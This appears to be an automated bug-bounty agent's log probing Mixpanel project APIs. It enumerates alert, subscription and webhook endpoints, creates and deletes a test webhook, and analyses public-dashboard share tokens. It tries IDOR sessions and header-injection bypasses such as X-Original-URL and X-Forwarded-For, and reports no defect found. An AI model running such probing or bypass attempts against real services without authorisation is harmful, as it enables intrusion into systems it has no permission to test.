[19:04:43] SSRF-TRIGGER: F-alerts?project_id=4025923-POST POST /api/2.0/alerts?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/alerts?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:45] SSRF-TRIGGER: F-alerts?project_id=4025923-OPTIONS OPTIONS /api/2.0/alerts?project_id=4025923 -> 200 Allow= [*] | 
[19:04:47] SSRF-TRIGGER: F-alerts?project_id=4025923-GET GET /api/2.0/custom_alerts?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/custom_alerts?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:47] SSRF-TRIGGER: F-alerts?project_id=4025923-POST POST /api/2.0/custom_alerts?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/custom_alerts?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:48] SSRF-TRIGGER: F-alerts?project_id=4025923-OPTIONS OPTIONS /api/2.0/custom_alerts?project_id=4025923 -> 200 Allow= [*] | 
[19:04:49] SSRF-TRIGGER: F-025923/custom_alerts/test-GET GET /api/app/projects/4025923/custom_alerts/test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/custom_alerts/test"}
[19:04:50] SSRF-TRIGGER: F-025923/custom_alerts/test-POST POST /api/app/projects/4025923/custom_alerts/test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/custom_alerts/test"}
[19:04:51] SSRF-TRIGGER: F-025923/custom_alerts/test-OPTIONS OPTIONS /api/app/projects/4025923/custom_alerts/test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/custom_alerts/test"}
[19:04:51] SSRF-TRIGGER: F-jects/4025923/alert_rules-GET GET /api/app/projects/4025923/alert_rules -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/alert_rules"}
[19:04:52] SSRF-TRIGGER: F-jects/4025923/alert_rules-POST POST /api/app/projects/4025923/alert_rules -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/alert_rules"}
[19:04:52] SSRF-TRIGGER: F-jects/4025923/alert_rules-OPTIONS OPTIONS /api/app/projects/4025923/alert_rules -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/alert_rules"}
[19:04:53] SSRF-TRIGGER: F-ts/4025923/anomaly_alerts-GET GET /api/app/projects/4025923/anomaly_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/anomaly_alerts"}
[19:04:53] SSRF-TRIGGER: F-ts/4025923/anomaly_alerts-POST POST /api/app/projects/4025923/anomaly_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/anomaly_alerts"}
[19:04:54] SSRF-TRIGGER: F-ts/4025923/anomaly_alerts-OPTIONS OPTIONS /api/app/projects/4025923/anomaly_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/anomaly_alerts"}
[19:04:55] SSRF-TRIGGER: F-ts/4025923/insight_alerts-GET GET /api/app/projects/4025923/insight_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/insight_alerts"}
[19:04:56] SSRF-TRIGGER: F-ts/4025923/insight_alerts-POST POST /api/app/projects/4025923/insight_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/insight_alerts"}
[19:04:56] SSRF-TRIGGER: F-ts/4025923/insight_alerts-OPTIONS OPTIONS /api/app/projects/4025923/insight_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/insight_alerts"}
[19:04:57] SSRF-TRIGGER: F-ects/4025923/board_alerts-GET GET /api/app/projects/4025923/board_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_alerts"}
[19:04:58] SSRF-TRIGGER: F-ects/4025923/board_alerts-POST POST /api/app/projects/4025923/board_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_alerts"}
[19:04:59] SSRF-TRIGGER: F-ects/4025923/board_alerts-OPTIONS OPTIONS /api/app/projects/4025923/board_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_alerts"}
[19:04:59] SSRF-TRIGGER: F-/4025923/dashboard_alerts-GET GET /api/app/projects/4025923/dashboard_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboard_alerts"}
[19:05:00] SSRF-TRIGGER: F-/4025923/dashboard_alerts-POST POST /api/app/projects/4025923/dashboard_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboard_alerts"}
[19:05:00] SSRF-TRIGGER: F-/4025923/dashboard_alerts-OPTIONS OPTIONS /api/app/projects/4025923/dashboard_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboard_alerts"}
[19:05:01] SSRF-TRIGGER: F-/4025923/threshold_alerts-GET GET /api/app/projects/4025923/threshold_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/threshold_alerts"}
[19:05:01] SSRF-TRIGGER: F-/4025923/threshold_alerts-POST POST /api/app/projects/4025923/threshold_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/threshold_alerts"}
[19:05:02] SSRF-TRIGGER: F-/4025923/threshold_alerts-OPTIONS OPTIONS /api/app/projects/4025923/threshold_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/threshold_alerts"}
[19:05:02] SSRF-TRIGGER: F-cts/4025923/metric_alerts-GET GET /api/app/projects/4025923/metric_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/metric_alerts"}
[19:05:03] SSRF-TRIGGER: F-cts/4025923/metric_alerts-POST POST /api/app/projects/4025923/metric_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/metric_alerts"}
[19:05:04] SSRF-TRIGGER: F-cts/4025923/metric_alerts-OPTIONS OPTIONS /api/app/projects/4025923/metric_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/metric_alerts"}
[19:05:04] SSRF-TRIGGER: F-4025923/scheduled_reports-GET GET /api/app/projects/4025923/scheduled_reports -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/scheduled_reports"}
[19:05:05] SSRF-TRIGGER: F-4025923/scheduled_reports-POST POST /api/app/projects/4025923/scheduled_reports -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/scheduled_reports"}
[19:05:05] SSRF-TRIGGER: F-4025923/scheduled_reports-OPTIONS OPTIONS /api/app/projects/4025923/scheduled_reports -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/scheduled_reports"}
[19:05:05] SSRF-TRIGGER: === G: webhooks UPDATE — does PATCH fire? ===
[19:05:06] SSRF-TRIGGER: G-create POST /api/app/projects/4025923/webhooks -> 200 Allow= [*] | {"status": "ok", "results": {"id": "9bf610f3-6d91-4c0a-a669-3e64596b0862", "name": "tp-patch-fire"}}
[19:05:07] SSRF-TRIGGER: G-PATCH PATCH /api/app/projects/4025923/webhooks/9bf610f3-6d91-4c0a-a669-3e64596b0862 -> 200 Allow= [*] | {"status": "ok", "results": {"id": "9bf610f3-6d91-4c0a-a669-3e64596b0862", "name": "tp-patch-fire"}}
[19:05:07] SSRF-TRIGGER: G-PUT PUT /api/app/projects/4025923/webhooks/9bf610f3-6d91-4c0a-a669-3e64596b0862 -> 405 Allow=PATCH, DELETE | 
[19:05:08] SSRF-TRIGGER: G-GET GET /api/app/projects/4025923/webhooks/9bf610f3-6d91-4c0a-a669-3e64596b0862 -> 405 Allow=PATCH, DELETE | 
[19:05:08] SSRF-TRIGGER: G-DELETE DELETE /api/app/projects/4025923/webhooks/9bf610f3-6d91-4c0a-a669-3e64596b0862 -> 200 Allow= [*] | {"status": "ok", "results": {"success": true}}
[19:05:08] SSRF-TRIGGER: === H: dashboard / report subscriptions ===
[19:05:09] SSRF-TRIGGER: H-cts/4025923/subscriptions-GET GET /api/app/projects/4025923/subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/subscriptions"}
[19:05:09] SSRF-TRIGGER: H-ds/11207838/subscriptions-GET GET /api/app/projects/4025923/dashboards/11207838/subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/subscriptions"}
[19:05:10] SSRF-TRIGGER: H-3/dashboard_subscriptions-GET GET /api/app/projects/4025923/dashboard_subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboard_subscriptions"}
[19:05:10] SSRF-TRIGGER: H-25923/board_subscriptions-GET GET /api/app/projects/4025923/board_subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_subscriptions"}
[19:05:11] SSRF-TRIGGER: H-/projects/4025923/reports-GET GET /api/app/projects/4025923/reports -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/reports"}
[19:05:11] SSRF-TRIGGER: H-/4025923/scheduled_emails-GET GET /api/app/projects/4025923/scheduled_emails -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/scheduled_emails"}
[19:05:12] SSRF-TRIGGER: H-025923/scheduled_webhooks-GET GET /api/app/projects/4025923/scheduled_webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/scheduled_webhooks"}
[19:05:12] SSRF-TRIGGER: H-923/webhook_subscriptions-GET GET /api/app/projects/4025923/webhook_subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook_subscriptions"}
[19:05:12] SSRF-TRIGGER: Saved /home/hunter/new_agent/results/mixpanel/ssrf-trigger-1780160610.json entries=172

[PUBLIC-BOARD] Start: share-link review on mixpanel.com, project=4025923, dashboard=11207838
[PUBLIC-BOARD] Confirmed feature: dashboard JSON exposes is_private=false, num_active_public_links=0, can_update_visibility=true; permissions include manage_public_boards + edit_share_settings + manage_project_public_dashboard_settings.
[PUBLIC-BOARD] Feature state: per Mixpanel docs, Public Boards is DISABLED by default per-project; project 4025923 has NOT toggled has_public_dashboards_enabled (num_active_public_links=0).
[PUBLIC-BOARD] Share-management API discovered: /api/app/projects/{PROJ}/public-dashboards (GET list, 200 -> []); /api/app/projects/{PROJ}/public-dashboards/{DASH} (OPTIONS Allow=GET,POST,DELETE; POST returns 500 because feature is disabled; identical 500 for ADMIN/MEMBER/IDOR -> not a privilege confusion, just consistent server-side failure).
[PUBLIC-BOARD] Could not enable feature via API (PATCH/PUT/POST on /projects/{PROJ}, /projects/{PROJ}/settings, /organizations/{ORG}/settings all 404). Setting only togglable via authenticated SPA (which is gated by browser fingerprinting in this environment).
[PUBLIC-BOARD] Token structure analysis (6 recon-collected tokens at /p/<22-char>): each decodes to exactly 16 random bytes via base58 (Bitcoin alphabet). No structural relationship between tokens; no project_id / dashboard_id / timestamp embedded. 128-bit entropy makes enumeration computationally infeasible (~3.4×10^38 keyspace).
[PUBLIC-BOARD] Endpoint behavior: /p/<valid> returns 200 + SPA shell HTML (byte-identical across all valid tokens; per-board metadata fetched via JS XHR which we cannot trigger headlessly). /public/<valid> returns the same shell. /p/<random22> returns clean 404 — no oracle. /public/dashboard/<token> from task brief does NOT exist on this deployment (returns 404); the live paths are /p/<token> and /public/<token>.
[PUBLIC-BOARD] Auth confusion: /p/<token> response is byte-identical with NO cookie / ADMIN / MEMBER / IDOR cookies — no privilege confusion, no data leak from auth attachment.
[PUBLIC-BOARD] oEmbed: /oembed, /api/oembed, /api/app/oembed, /api/app/embeds all 404. No oEmbed surface present.
[PUBLIC-BOARD] Cross-tenant API isolation OK: IDOR session GET /api/app/projects/4025923/dashboards returns marketing HTML "Request Access" page (correct membership enforcement); MEMBER + ADMIN return JSON.
[PUBLIC-BOARD] Header-injection on POST /public-dashboards/{DASH}: X-Original-URL, X-Forwarded-For, X-Real-IP, X-Internal, X-Mixpanel-Feature, X-MP-Feature-Flag all return 500 (no toggle bypass).
[PUBLIC-BOARD] Conclusion: NO bounty-eligible security defect identified in the share-link mechanism observable from the API surface. Token is cryptographically random; endpoint enforces membership for project APIs; no metadata leak from public-page shell; no oEmbed; no privilege confusion. Findings logged as LEAD only (negative result with full evidence).
[PUBLIC-BOARD] Cleanup: no public-dashboards were created (POSTs all 500'd before creation), nothing to disable; no state modification on the target.
